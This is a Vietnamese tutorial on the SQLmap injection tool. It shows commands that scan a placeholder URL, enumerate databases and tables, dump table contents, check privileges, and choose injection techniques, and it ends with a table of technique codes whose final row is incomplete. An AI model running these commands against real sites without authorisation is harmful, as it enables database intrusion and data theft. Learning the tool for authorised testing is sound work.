## SQLmap

### Cài đặt SQLmap
Nếu bạn đang sử dụng Kali Linux, SQLmap thường được cài sẵn.

Cài đặt thủ công: 
```bash
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap
cd sqlmap
```

### Các lệnh cơ bản của SQLmap
- Quét mục tiêu:

```bash
sqlmap -u "http://example.com/index.php?id=1"
```
    
    - -u: Chỉ định URL mục tiêu.
    - Mục tiêu ở đây là URL chứa tham số khả nghi (vd: id=1).

- Tự động dò tìm kiểu tấn công:

```bash
sqlmap -u "http://example.com/index.php?id=1" --dbs
```

    `--dbs`: Liệt kê các cơ sở dữ liệu trên máy chủ.

- Chọn cơ sở dữ liệu và xem bảng:

```bash
sqlmap -u "http://example.com/index.php?id=1" -D database_name --tables
```

    -D database_name: Chọn cơ sở dữ liệu.

    --tables: Liệt kê các bảng.

- Truy xuất dữ liệu từ bảng:

```bash
sqlmap -u "http://example.com/index.php?id=1" -D database_name -T table_name --dump
```

    -T table_name: Chọn bảng.

    --dump: Tải toàn bộ dữ liệu từ bảng.

- Kiểm tra và khai thác quyền admin:

```bash
sqlmap -u "http://example.com/index.php?id=1" --privileges
```

    --privileges: Hiển thị quyền hạn của user cơ sở dữ liệu.

### Một số tùy chọn nâng cao

- Dùng cookie: Nếu trang web yêu cầu xác thực qua cookie.

```bash
sqlmap -u "http://example.com/index.php?id=1" --cookie="PHPSESSID=abcd1234"
```

- Chạy POST request:
```bash
sqlmap -u "http://example.com/index.php" --data="id=1&name=test"
```

- Chọn payload cụ thể:
```bash
sqlmap -u "http://example.com/index.php?id=1" --technique=U
```

    --technique=U: Chỉ thử khai thác UNION-based SQLi.
    Các giá trị có thể là B, E, T, U, S, Q.

Kí hiệu | Loại | Mô tả
--|--------------------|---------
B |	Boolean-based Blind	| Tấn công SQLi mù dựa trên đánh giá đúng/sai của câu truy vấn SQL (thông qua phản hồi).
E |	Error-based |	Dựa trên lỗi trả về từ máy chủ để lấy dữ liệu (các thông báo lỗi SQL).
T |	Time-based Blind |	Tấn công SQLi mù dựa trên thời gian trễ khi thực thi truy vấn SQL.
U |	Union Query-based |	Sử dụng mệnh đề UNION SELECT để hợp nhất kết quả từ nhiều truy vấn SQL.
S |	Stacked Queries |	Gửi nhiều truy vấn SQL trong một câu lệnh (thường cần máy chủ hỗ trợ).
Q |	Out-of-Band (OOB)















